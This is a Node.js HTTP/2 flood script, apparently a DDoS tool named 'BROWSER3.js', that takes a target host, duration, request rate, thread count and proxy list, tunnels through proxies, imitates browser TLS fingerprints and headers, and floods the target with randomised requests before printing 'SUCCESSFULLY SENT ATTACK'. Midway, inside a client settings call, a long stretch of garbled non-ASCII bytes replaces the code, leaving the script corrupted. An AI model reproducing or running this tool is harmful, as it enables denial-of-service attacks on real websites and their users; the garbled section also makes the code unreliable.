const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const gradient = require("gradient-string")

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(gradient.vice(`[!] node BROWSER3.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ]; 
 const lang_header = ["en-US,en;q=0.9"];
 
 const encoding_header = ["gzip, deflate, br"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
     "https://www.google.com/",
     "https://www.facebook.com/",
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "https://www.linkedin.com/"
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 //headers["X-Forwarded-For"] = spoofed;
 //headers["X-Forwarded-Host"] = spoofed;
 //headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 //headers["origin"] = "https://" + parsedTarget.host;
 //headers["referer"] = "https://" + parsedTarget.host;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = randstr(15);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 //headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
u×äõâÃ¬¤ñÑä÷ãÈþ£¡ÚçÖðåÆü òÑ²×Èð±Æ¨ö¡Ñº¢°ü«¤»ÕòâÅ¨óñ¶ÜÜÈ¡ãÉ¦«§ºÒÌ¦¾¨ö¤Ð³ó¾Â­§ ÒºÔÉðäÉý¤§ÚáÒÛÎ÷³¨ £ãÛð·Â®ªð±ÔÌ¡å¬ ö×·ÒË¦ãù¡ ´Îñ¾­¢öÑäÒÛÈ¦¶­ñ¢µÑÞ¦±­ öÑàÜÞõ°È®£ö±Ü÷çÀ¬«ñ´Ñ¦¶Ã¬¥ñ±Þ¢ãÃ©ô¦¶¢±Á§§ªÓäÕò±¦¥ö´ÔÜÏð±Å­£÷Ñ»ÜÎö¿Ä¬¦¥ÚµÑÙÎ§³Ç©  µó¾È©ªõ×·×Ìö±Åª¤§Ú°û³É¬¡ª±Ý¦çû§òÓ·Üõä¦ñòÑ³Ó äÀù÷¦µÝ¥±Éüð áÝô¾Âú÷¦²ÖòäÀ¨ó Ö´ÐÉôµÇª¢¢×²Üû³¬¥ Ô¶ÓÏ¦·ùô÷Ö´ÒÚËö²Àª¡ªÐºÓÞÌ¡ãÄ¯ñõ¶ÕÙËûäÃ«ó«Ó´Ì µÃ¨ð¤Ò°ÖóåÃ¯ª÷ÖãÖ¢·Ä¦÷ñ±ó³Àù¦§³òâÅ©¡öÛáó¾ù¡ªÔã×ò¿Âª§òÖ»Ö¢±É®¡÷³Î ¶ýö¤Ð±ÓÞÈû¿¨¢§ºÔÌ¥¿Ãþó¢ÓãÓÛÈú±Éù ñÑ² àÇ¬¡¥ºÈò²§£ðµÐû¶Ä¬¢ªºú¶Àûð§àÒñ´Âª§¢äÕòàÄ¯£ñ×»ÝÏ¥âÀ®óñ·ÖÌú²Èúó¡ÛàÖ¥³Ãª÷§ÔáÔÈ °¬ñðÕã×Ù§µ©¦¡ÛºÕÛûµÇ«£§°È¥´®¤òäÕ¦¾È¨ôªá×Ùô´É¨ðñÓ·Îð¾Ã¯ô¦Ñ·Ý§´§¡«ÖçÜ¢µÅ¯óöÑ±Úò±¯  Û»Öö¾Éª¡ªæÓÞõçÄ®¥ Ñ³ÜÈûâÃ¨¤òàÙú¿Â­§§°ð¾Ç®÷¡Õºôã«¥¤ºÐÙòäÅ¯ ¢ÛºÕö³Âù÷ñÔá÷²üóªÕ´ÝÙ÷å¯¦ð±ÓÝ¥¿©ññäô·«ö¢ÓçÜÜ¢âÁ«£«Ñ¶ÕÞÉû´È¬¦ªÔ»Ö÷àÂû¤÷Ñ»ð¿úö¤Û²ÖË¡·Ç¯ðñÐ´Ô¡´ùö«×çÓÈ¥àÃ©ñªãÈ¦¶ÂýóªÑµÔ¥å¬ô÷¶ÜÉóâÂùñöÐäÒÚû³ÂþôñàÓÙÎûâùöªÒ±ô·®¥ª´ÒûåÅûô Ó¶ÕÞö´Éú¥¢çÜ§µÁû£ñ°õ¿Âü£÷ÚºÝÝñ³ÀªóªÕ²Ú¥¶¨«¦ÒäÕÙÌó²­ô ×äÖúçÇ©¡ñÒãÛËõçû ¡ÕäÕû¾«ñð×ºÕÛÌú¿É¬ôõ¶ÜÙÈ¡´Å®¢òä÷ãÄ¯§õÐäÔÞ§äÇýóõÑ»ÜÙÏ ¾Ç¦¤ðÔ»ÙñµÉû÷ñÑµÜÞÌðàÈ¬ó¥ÔãÜ àÅý§ð²¢µú¡¡°ÐÈ¡¶¨£öæÑÎ÷¿Æþ«ñºÐÈ µÈ§ðª·ÕÉú¶® §Ö²ÔÜô¿þ «ÔäÕÌ¦¾Á­÷¡×±×òµÂý§õÒµÜÏ§³¯÷¡Ñ»ÙÉöãÂú¡öÐ°ÐÙ÷¾û«¢Ó±ÖÎû±ÀûôñÑ·Î÷ãü§ ÚãÞ§çÀ¯ðòÖ±ÖÙÌö°§¡öæÎ¦¶þô§Ôºð·È©óñµÓÛÌúä¯ñ¢Ú»Ó¡¶úö÷Ö³ÜûµÃ¯£ªÚ²ÐÝû¶­ £ÐáÐõ·­ó¤ÕàÐÛÉó¶Éúð¡Ò°ô´À«ðõáÑûµþö¤µÒÈðµÈüð«ÔçÒÜõä§§¤×áÐÝðåÄ«§«±ÐÜÉû³Ä«ö¤Ò°Ë¦²ü¦£»Ó ±ý¤ñ°ÞÏôçüô¤ÑäÕõäÉª£¢äÕË¢àÁ¯ª§×·ÔÚðçù¤¦²ÝÈûµÀù«ñÔ²ÜÜó³Æü§¦Õ°ÜòäÀ­§ ÕäÐÙ¢àÁý«ªÔ¶Þò°Ã¬¦«Ô·Öòäý¤ñÕ²Þ¢çÅ¦« Ú²Ôõ°þ¢¡Öµ¢åÆ¬¦öÑçÐÝ÷²Èüñ¢ÓáÑË¦²Á© ¤ÖäË ¿Åû¤«ÓµÕÝõ¿Á¦«òÐ·ÖÉó¾ü¡¦Õ²Õ¡ã«¢«Ö¶ÜÝÉ÷ãÂþó«Ò»ÐÈ¢±Âùñª»ÑÉ¥âª§¤ÐäÐÎ§äÉ¦£¤×àÈ å­£¤áÔò°Ãüð§°Öó¾Æ©§§ÕµÎñãÆýª¤³ÓÝËó°ûð¢×ãÚ¥àÀ««ªÒ±ÑðµÈ¬¥¦Ñ±ÜÌû¾Çþô¤·Òû¾Éù ñçñâ¬£ñÔ°¢àÉû¥¥ÔæÕÝ§´Ä­¦¡ÚæÔÈôäÄ««§ÐºÑÜÈñ³Å§ñ¤Ô±Öò±Éù§õÖµÐÞË¥åü§«×ºû¾Éþ§«Òç¢¿Ä®¥õ±§´¬¦õÛ¶ÜÚñà§ñòÕçÓûàÇ©££ÚãÐËô°Äþ÷¦á¡°Å¦ðªáÒÙ¢å¨ð¦ÕáÑñ²Å¦£¦ÒµÕÏò±ý¥ª»×ÞôåÈªö«çÞ¥´ú¢¦ÒçÓ÷±«ô¢Ú²ÝÎð¾Â«ö ÚãÑ åÃþöñÐºÝË¦·ù¡õµû²È§««Ö»Ý¦åÇþó¥Ó²Û§¶Èü÷¡³úãÁ®÷õ°ÕÞÌ§äÉ®÷¦°Îû°­«öÓºÓÚÌ÷¶Åù¥«×°ÓñåÆ¯¥òãÖÌò´¯ö«ÐãÓ§±ÄüñªÑ±ð´À¦ööÐºÉ¦³©óòÐ»×û¶ù¥÷áÕÛ¦±¨ó÷³Ý§³Äü¥¡ÓáÜÈ÷°¨ «ÐáÔú³ûª¦²Ïð¿¨÷÷ÔäÑ¢àÀþ §áÐú´Ä¬ª¤æÖÎ¦çÃþö£Û»ÒÛÈò±É¦ô¤Õ¶Ôû´Â«¡¢Õ»ÐÝÈóãÅ­¦¥ÓºÔÞÏöçÁ§ðñ×ãÑÉ÷¿«¤§ÖàÕ¡àÃ¦ö¥àÓÈ÷¿È­ªõÛ·ÐÌ¡çÂþóðÓäÐÙËñåú¦¥äÞòàÄ®÷ñµÓÝÏ¡âû¦«»ÕÈ÷·À¨¤ªÑ·ÓÞÌõ¶Ã©¡ªÕäÔÝÉõ³ùª¦ÑãÞôµþ¤ðÐ³×ÝËöµÅû÷ Õá×Ûö±Ã©÷öÑ°Ì¢·®ñ¦æÕÉ§ç©ô¥ÕáÖÙ§°ý§ª·Ü¥¶Á¨ö¥Ñ¶ò¾Â«¦ð»öäÅûôªÓ°ÐÜÏ ±Æ©¡¥µöçÉú«ðÛçÐÛÏðä©¢«±¡äÀùñðÓäÒú¶Æþ£öàÜÌ¦çÂ¬ð¤ÓãÎñäþô¤×àÛðàÇû£õ·ÓËöçÈùô£×°Ì¢åÂýð÷ÔçÖÞñ¶Ãù÷ñÛæÝ¥µÂü¢¥Ñ·Óô´Å¯ôªÑäË¦åÃªó«Ñ±Ò¡åÆ«ªõÛ²ÑÜÉ¢¶Çûóðµ×÷±À§¤¡ÕäÒú¿¦¥£áÐË§ã©ô¤Ð°§ãÆúðõáÜò¶Ãú¢£æÉ÷à®ðñäÈúäÂý£¥ºÙðµ­÷¢Õ±Îô°Ä§¡«ÒäË÷¶¬«¢ÑãÓ¦µ¬ô¢Ö¶ÑÙôå¯ô¥äÐò²Âþ¤§Û²ÒÙÌñçÄû¡÷Û·Òõ³Æ¯ñ¢ÒáÒ§¶Ã¯«ª¶ÓÜðã§¤öµÕÜÏóãÇþ¥öäÔó¿Å§¦ ×°óäÁûô«Û´×Üó¾É¦«ñÚ¶ÔÈ§³È¯ó«æÝÙ¡àªóöÒãÔóåÁ¯÷õÚºÙ µ¨¡÷äÑÝ °Äª÷ö°ÓÈ÷·Ç®¥¡Ú°È¦³Ä§¦ñÚæÔö°¨ôðÕ»ÓÉ¦¶®ñ÷äÜó·ýññ·Ü¥´Çý¡õÚäÝ¦´ùô¥ÓäÝöâÇùóõÐ´ÜÚõç© ¤µÕú±Âþ§òÒ»ÑÙ¥·þ«¤Ó»¢ãÈúª µÑûåÄý§ Ö³Üó¿Âú¢òÑ³Õñç¯óò³Öö¶Ãþ¡¦Ó±ÔÝ¢±Çþ÷öæÖÙ¦¾É¯««ºÝ¡äû÷§ÕºÕÜÎñâ¦£«ÛãÖ¦çÄ¬«ñÓºÔÏ ´Æþô¢áÉó·Á® ¢Ôá¢±Ã¯¥öÓ°ÛÏò¿Æú£òÚäÜ¥â­ô÷äÚÎöåÁ¬§ª´ÜÌð¶Ç¬¥«Ò¶Ñ§µÅ©§÷Ó±ÑÜÈ¥·Äþô ×µ¡ãÃ®¤¦Ñ´ú°É¬£«Ûá¡à¯¡öÓáÔö¿§¢ Ö·Ð¢ã©§öÛµ÷·É§ô«Õ°Ñ¡°¬¥ à×÷ãÁ¨¢ñÖ°ÒÚÎò±È«¦ðÚ´ÚõâÉ§ ð¶¥ãÂ¨¤õÔçôäÀ¨ªòÖäÝñ´ª¢òçÑÈñ±Äùª¡àÕÞÎöå®«§ÓáÓÛÎ¢¾©«÷ÑäÎò±Ã©«¥¶É ä«÷¢ÑæÒû°«£«³Òúåª õÖºÐÜó±ÇüôªÛçÑÈòµ¨¡£°ÔñµÉ¨£ªÛæÝ§äÅú¦ ÐµÉ ·Äª¤¥ÚµÕÏ§²Ç§§ñçÒú·¨¢÷¶§´Â¨ ò×ºÝûâÃý«¤Ö·ÙÎöâÉª¦ð×·ÝÜû³Æýó£×æÈ â«§ªÛ»È¥äÂû öÑ·ÓÚÌ÷´¯ñ¢Ú·Ð¥åÄ¯§õÖãÙ¢¿Åþ §ÕæÖÞðçüññÐ²×É§·À¯§ Õ·ÑÈñãÆüª§Ó°Ý¥â­ôöáÕÚ÷°É¨£¦ÖçÝË¢²Æ¨ð§ÖºÜöà§¢ª´Úöµ¬ñ¤Ó°Ý¥²¨§ ÑµÐÛöçÇüð¥ÐàÑÚöâ«öõÓãÓ÷·Ã©£÷Ñ´Ô¦¿È¯öö»Ó¦àÅ¨¢¡ÔãÒ§´Ç§ðñá§¶É¨«öäÓò´®¡£Òáó·Â¯óòÔàÒÚÌ§äýö¢´ÓÈ °§¢¢ÕãÝðâÀ¦¤÷×²ÓÎõåÄ©ö¤ã×ÎôàÀ§ô£×äÙ¡ã¦¦ð´Õ µÂû§¡Ö²ÑÜ÷²úó¢ÑºÜ¦°Äþ ¤çõ³À¯¥ªÚæÔÙ ·Éü¤¢Ú»öàùª«á ¿Â«ð¢×çòµ¦ô§æÑôåÉ¨¤¡Õ³ËôäÇ§¢ Ô·ÑôäÈ§ôñÚäÙö·Çªð¤ÕæÝË¡²Åù£¡äÖÛòãÉ«¦«Û´ÔËóçûö£µÜÛÏð±ù¥¦Õ³ÑóåÈ¬ô¥×³ÛÏ ¿Á® ¢×áÙ¦µ­§£Û¶×§âú¡ðÕ²ÐÝõà¨ðö²ÑÝË ¿Ç©óñÕæ×ÞËô¶ùñõÓ»×Î¡äÄ¦ó÷ÛäÝôäÉ¯¢õµËñ·¯ª¥Ô°ÐÎõ´Å§¢ ´Ë¥µÉþ¡¦·ÜÚúàÇþ¦ð×¶Îðâ¦ öäÚÈûåÄ§ôò°ÑÈ¢µª¤òÓàÉ¦±Ãúö çÔÌûãÈýð¥´Îû²Èþ£ »ö·Á§§ò·Ý ¿§ª¡»ÝûãÀþö«Ð´ÐöµÆû«¥äÐÚÈ¡±ú ¡ÒºÐÚð¿Æ­¦£Óà×Ïñ³Éû¢òÛ´ÓÚôâÇüª¥çÞ§¾üô¡Õã ¾ù¡¦Õ¶ÓÜð²É¦¢§Ò±ó¿Ãª¦«æÕÞûäú£ñ×»Ò§äù¦¤ÓæÔÙ ±û¥¥»×Þð´Äþª¦·Û§²ùöò×äÉúä©¤ñÐ°ÜËñ±¨¥£°ûåú £Ö²ÔÏ¥°Ä­ñ¥ÑàÓÝñ³Äùñ¢Ú²Öú¿«¥¤Õ´Ýó±Éü¤«Ñ·ÑÛúä¯¤ªæÓò°Æ¬§÷º¥°©¥£Ñàö·È«÷¤æÝ¥²Èª¦ñ×ãÙ§àÇ§£¦ÔæÕú±­¤÷×ãÎ¢µÂ®«òÒºÝÈò´À§ô¦ÕáÕË÷¿Â§ñ ±×§åÀú¡«Ö»Ïðàþ«§Öµ§¿ú¥¤±×ö±¯ªñÔµÓÞû²Âª«ðÕãÏðä¬ª¦àÐ µúó¦×ãÑË¡å«¢÷Ð·Ôû³­ª÷ÕµÉðãÃ¦ö÷ÑçÙÏö°Èý ªÚµð¿Ãª£ªÐã×ÝÈ °Æ¦ðõÛ²Ö¥¶úñ¦Öºñ¾­ª¢ÚæÑÛ¡¿Áûó¡ÒºÔôà¯¥ªÓçÔöåÅ¯¢¥±Ó¡´Ã®ö¢Ô·ÝÞ÷¾ýôòàñäÆ®ô¥ãÕôâ­ó¡àÕËðçÂ¬ó¡Ò»Èú²Çüð¥ÖáÔ¡²Èûö¢ÔçÜ ¿Æ§«õáÜò·Äùª¡ÒµÏô±ýôöÖãÝõàú¤¤çÜö´ûªñÒàÕÜÉö¿Æþóö³×ÌôåÈþ¢¥Ö°ÜÏ¢·Á­ ðÐ°ÑÛ÷¿Ä¦¤¡Û±¢âÄùö¥Ú°×ÞÌñ³Áù£õÖàÒôçÆù¤¤Ò¶ÔÝÎ¦àÇý÷ªÖ³§·¬ôöÑ±ÞË÷±Ä¨ «çÖó³û¢õäÑÌð²Æùö¤Ðã¦ãÇùó¦ãû¶¦öñÓ±ô¿®§ð³ÖÚñä¦¥õ°ÜóäÀ¯÷¤×àÑñµÉý§£æñ´Ç§§§ÚçÎ¡²Éú£õÕàÏû·Á®£öÖµÝ¥ãÇ®öö³ÓËñ¿Âù¥£ÓáÖ ã¦«÷´Ýò±«ôòÖáÈóàÂ©ó¦ÓæÜÛõçÅù¢¢ÐçÝ§³Çù÷£»ÉúâÁªôòæ§äÂû¡òÓã×öµù«ªãÈñ°É¯¦öÐºÞ¦´ýðòÔáÓÛÌû¿Àªð§Ò°×ñ¾««¥×³ÓÈ¢¿Å®¤ò±Ïô¿É§÷¥ºË¦¾Ç¦ñ£Ò¶Òû´®ðð»ÞÈûãÀú¢£ºÜÈ÷±Â©§¤ÒäÌ¦·Ã§ª«´ÎöãÁü§§ÐºÖË¢³Ç§§ð±ÐÈ÷°Æ¬£ö´É¢´Çþ¡§ÓºÜñàª£ñ°Üð·À¨ ¥Ò»Ô÷¿¬¡÷Õ¶ûçÇþ¢¢ÐäÓûåÇû¥¤æÝ ²Èù¥¥ÓºÕÈ¢²Ä¯ª¥ÓµÚð²Ãùö£´ÜÎñ±ª¥ª°ÎóçÃ¨ª Óà¥³© ¢ãÔÚóàÁþ¡ö¶Ö
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);